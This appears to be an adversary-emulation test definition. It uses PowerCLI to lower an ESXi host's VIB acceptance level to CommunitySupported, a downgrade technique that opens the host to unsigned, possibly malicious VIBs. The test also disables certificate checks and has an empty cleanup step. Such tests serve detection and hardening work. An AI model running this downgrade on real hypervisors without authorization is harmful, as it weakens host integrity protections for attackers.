api_version: "2.0"
name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
description: |
    An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
args:
    - name: vm_host
      type: string
      default: atomic.local
    - name: vm_user
      type: string
      default: root
    - name: vm_pass
      type: string
      default: pass
uuid: 062f92c9-28b1-4391-a5f8-9d8ca6852091
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.010: Downgrade Attack'
requirements:
    platforms:
        - os: linux
steps:
    - name: esxi---change-vib-acceptance-level-to-communitysupported-via-powercli
      inline: "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server {{.Args.vm_host}} -User {{.Args.vm_user}} -Password {{.Args.vm_pass}}\n(Get-EsxCli -VMHost {{.Args.vm_host}} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
